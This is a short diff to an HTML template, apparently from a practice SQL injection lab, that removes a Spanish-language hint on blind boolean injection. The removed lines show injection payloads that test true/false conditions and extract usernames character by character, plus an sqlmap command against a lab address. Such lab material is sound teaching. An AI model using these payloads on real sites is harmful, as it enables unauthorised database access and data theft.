@@ -39,14 +39,5 @@
   </div>
 </div>
 
-<div class="hint-box mt-3">
-  <div class="hint-title">técnica: blind boolean inference</div>
-  <p>
-    <code>?id=1 AND 1=1--</code> &nbsp;→ existe (TRUE)<br>
-    <code>?id=1 AND 1=2--</code> &nbsp;→ no existe (FALSE)<br>
-    <code>?id=1 AND SUBSTR(username,1,1)='a'--</code> &nbsp;→ extrae carácter a carácter<br><br>
-    Con sqlmap: <code>sqlmap -u "http://IP:5000/challenge/4/level1?id=1" --dbs --batch</code>
-  </p>
-</div>
 
 {% endblock %}
